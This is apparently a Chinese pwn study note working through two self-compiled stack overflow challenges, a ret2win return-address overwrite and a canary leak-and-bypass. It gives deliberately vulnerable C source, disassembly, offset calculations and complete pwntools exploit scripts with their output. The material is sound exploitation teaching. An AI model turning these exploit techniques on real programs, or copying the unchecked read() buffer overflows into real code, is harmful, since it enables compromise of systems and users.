---
title: "01.1 栈溢出经典例题"
description: "通过两道实测例题演示返回地址覆盖（ret2win）与 Canary 泄露绕过的完整流程。"
categories: [Pwn笔记, 第01章 栈溢出]
tags: [stack, buffer-overflow, ret2win, canary]
---

本文接 [01.0 栈溢出概述](/posts/stack-overflow/)，用两道题把栈帧布局、偏移计算和 Canary 泄露走一遍。两道题都在 Ubuntu x86-64（gcc 13）下实测编译打通。

## 例题一：覆盖返回地址到后门函数

### 题目源码与保护

```c
#include <stdio.h>
#include <unistd.h>

void win(void)
{
    puts("flag{ret2win_success}");
}

void vuln(void)
{
    char buf[64];
    read(0, buf, 0x200);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("Welcome:");
    vuln();
    return 0;
}
```

编译为关闭 PIE、关闭栈保护的 64 位程序：

```bash
gcc -no-pie -fno-stack-protector -Wno-unused-result chal0.c -o chal0
```

`checksec` 结果：

```text
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

没有 Canary、没有 PIE，`read` 又能读 0x200 字节，是最干净的 ret2win。

### 反编译与偏移

`vuln()` 的序言直接给出了缓冲区位置：

```asm
401190: endbr64
401194: push   %rbp
401195: mov    %rsp,%rbp
401198: sub    $0x40,%rsp
40119c: lea    -0x40(%rbp),%rax     ; buf 在 rbp-0x40
4011a0: mov    $0x200,%edx
4011a5: mov    %rax,%rsi
4011a8: mov    $0x0,%edi
4011ad: call   401070 <read@plt>
4011b2: nop
4011b3: leave
4011b4: ret
```

`buf` 在 `rbp-0x40`，返回地址在 `rbp+8`，中间只隔一个保存的 `rbp`，所以覆盖偏移是 `0x40 + 8 = 72`。

后门函数 `win` 的地址可以从符号表直接取，`elf.sym["win"]` 就是 `0x401176`。

### 完整 exp

```python
from pwn import *

elf = ELF("./chal0")
context.binary = elf
io = process("./chal0")

io.recvuntil(b"Welcome:\n")
io.send(b"A" * 72 + p64(elf.sym["win"]))
print(io.recvall(timeout=2).decode(errors="ignore"))
```

前 72 字节填满 `buf` 和保存的 `rbp`，最后 8 字节把返回地址改成 `win`。`vuln` 执行到 `ret` 时弹出这个地址，程序跳去打印 flag。

运行结果：

```text
flag{ret2win_success}
```

`win` 打印完就 `ret` 到栈上的垃圾数据，进程随后可能崩掉，这不影响结果。看到 flag 就算成功，不用管 `Segmentation fault`。

---

## 例题二：泄露 Canary 绕过栈保护

### 题目源码与保护

```c
#include <stdio.h>
#include <unistd.h>

void win(void)
{
    puts("flag{canary_bypass_success}");
}

void vuln(void)
{
    char buf[64];
    read(0, buf, 0x100);
    write(1, buf, 0x100);
    read(0, buf, 0x100);
}
```

编译时不加 `-fno-stack-protector`，让编译器插入 Canary：

```bash
gcc -no-pie -Wno-unused-result chal0b.c -o chal0b
```

`checksec` 结果里 `Stack: Canary found`，其他和上一题一样：Partial RELRO、NX 开启、无 PIE。

程序给了两次 `read`，中间夹一个 `write(1, buf, 0x100)`。第一次只发 1 个字节，`read` 就返回，`write` 会把 `buf` 往后 0x100 字节的栈内容原样打出来——包括 Canary。

### 反编译与偏移

```asm
4011d0: endbr64
4011d4: push   %rbp
4011d5: mov    %rsp,%rbp
4011d8: sub    $0x50,%rsp
4011dc: mov    %fs:0x28,%rax        ; 取 Canary
4011e5: mov    %rax,-0x8(%rbp)      ; 存到 rbp-8
...
4011eb: lea    -0x50(%rbp),%rax     ; buf 在 rbp-0x50
4011ef: mov    $0x100,%edx
...
40122e: mov    -0x8(%rbp),%rax      ; 返回前取出 Canary
401232: sub    %fs:0x28,%rax        ; 和 fs:0x28 比较
40123b: je     401242
40123d: call   4010a0 <__stack_chk_fail@plt>
401242: leave
401243: ret
```

`buf` 在 `rbp-0x50`，Canary 在 `rbp-8`，两者相距 `0x48`。所以泄露时从 `leak[0x48:0x50]` 取 Canary，返回地址在 `leak[0x58:0x60]`。

布局是：

```text
buf[0x00..0x47]   填充
buf[0x48..0x4f]   Canary
buf[0x50..0x57]   保存的 rbp
buf[0x58..0x5f]   返回地址
```

注意 `buf` 到 Canary 是 `0x48`，不是 `0x40`。源码写的是 `char buf[64]`，但编译器为了对齐多分了 `0x10` 字节，Canary 也跟着往下挪。这就是为什么偏移必须从反汇编读，不能按 `sizeof(buf)` 拍脑袋。

### 完整 exp

```python
from pwn import *

elf = ELF("./chal0b")
context.binary = elf
io = process("./chal0b")

io.recvuntil(b"Welcome:\n")
io.send(b"A")
leak = io.recv(0x100)

canary = u64(leak[0x48:0x50])
log.info(f"canary = {canary:#x}, ret = {u64(leak[0x58:0x60]):#x}")

io.send(b"A" * 0x48 + p64(canary) + b"B" * 8 + p64(elf.sym["win"]))
print(io.recvall(timeout=2).decode(errors="ignore"))
```

第二次输入把 Canary 原样填回去，`sub %fs:0x28` 比较通过，`leave; ret` 就能正常跳到 `win`。

运行结果：

```text
[*] canary = 0xd9f9f28392cfee00, ret = 0x40127e
flag{canary_bypass_success}
```

Canary 每次运行都不一样，`0xd9f9...` 只是其中一次的样本。脚本里必须现泄现用，不能写死。

---

## 常见踩坑小结

- **偏移按当前二进制算**：同一个源码，开不开 `-fstack-protector`、换 `-O` 级别、甚至换个 gcc 版本，偏移都可能变。从反汇编读 `lea -0x??(%rbp)`，再用 `cyclic` 验一遍，别抄。

- **Canary 用 `write` 泄露**：Canary 最低字节固定是 `\x00`，`printf("%s")` 和 `strcpy` 在这里就停了。`write(1, buf, n)` 按长度输出，不受影响。

- **Canary 每次启动都变**：本地调试记下来的值换次运行就失效，脚本里必须现场泄露。

- **返回地址之后别多写**：payload 刚好 `填充 + canary + rbp + 目标地址` 就够。多写的数据会落到返回地址之后的栈上，运气不好会把 `win` 用到的栈内容踩坏。

- **ret2win 成功不一定是干净退出**：`win` 执行完继续 `ret` 到垃圾地址，进程崩掉很正常，判断标准是有没有拿到 flag，不是退出码。
